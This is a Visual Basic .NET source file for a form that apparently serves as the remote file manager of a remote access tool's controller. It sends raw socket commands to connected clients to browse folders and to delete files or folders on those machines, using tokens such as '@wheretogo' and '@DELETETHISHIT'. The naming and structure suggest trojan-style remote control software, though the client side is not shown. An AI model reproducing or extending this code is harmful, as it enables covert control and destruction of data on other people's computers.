Imports System.Net.Sockets
Imports System.Text

Public Class FMM
    Private Sub lv_DrawColumnHeader(ByVal sender As Object, ByVal e As DrawListViewColumnHeaderEventArgs)
        e.Graphics.FillRectangle(Brushes.GreenYellow, e.Bounds)
        e.DrawText()
    End Sub
    Private Sub FMM_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Sub GoToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GoToolStripMenuItem.Click
        Dim theendpoint As String = Me.Text

        Dim Folder As String = Label3.Text & "\"

        '      Dim wheretogo As String = ListView1.SelectedItems(0).Text + "\" + "@wheretogo"
        Dim wheretogo As String = ListView1.SelectedItems(0).Text + "@wheretogo"

        Dim AllToSend As String = Folder + wheretogo

        Dim buffer() As Byte = Encoding.UTF8.GetBytes(AllToSend)
        For Each client As TcpClient In Heathen.LesClients

            If theendpoint = client.Client.RemoteEndPoint.ToString Then

                Try
                    client.GetStream().Write(buffer, 0, buffer.Length) '''
                Catch ex As Exception

                    MessageBox.Show("The client seems to be offline")
                End Try
            End If

        Next
    End Sub

    Private Sub BackToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BackToolStripMenuItem.Click
        Dim theendpoint As String = Me.Text



        Dim wheretogo As String = Label3.Text.Split("/").Last() + "@ShitWegoback"


        Dim AllToSend As String = wheretogo

        Dim buffer() As Byte = Encoding.UTF8.GetBytes(AllToSend)
        For Each client As TcpClient In Heathen.LesClients

            If theendpoint = client.Client.RemoteEndPoint.ToString Then

                Try
                    client.GetStream().Write(buffer, 0, buffer.Length) '''
                Catch ex As Exception

                    MessageBox.Show("The client seems to be offline")
                End Try
            End If

        Next
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem.Click
        Dim ThefileOrFolrderToDelete As String = Label3.Text + "\" + ListView1.SelectedItems(0).Text
        Dim theendpoint As String = Me.Text
        Dim Itstimetodeleteselectedfile As String
        If ListView1.SelectedItems(0).ImageKey = "files" Then


            Itstimetodeleteselectedfile = "@DELETETHISHIT" + "FILES"

        ElseIf ListView1.SelectedItems(0).ImageKey = "folders" Then

            Itstimetodeleteselectedfile = "@DELETETHISHIT" + "FOLDERS"
        End If

        Dim AllToSend As String = ThefileOrFolrderToDelete + Itstimetodeleteselectedfile


        Dim buffer() As Byte = Encoding.UTF8.GetBytes(AllToSend)
        For Each client As TcpClient In Heathen.LesClients

            If theendpoint = client.Client.RemoteEndPoint.ToString Then

                Try
                    client.GetStream().Write(buffer, 0, buffer.Length) '''
                Catch ex As Exception

                    MessageBox.Show("The client seems to be offline")
                End Try
            End If

        Next

    End Sub
End Class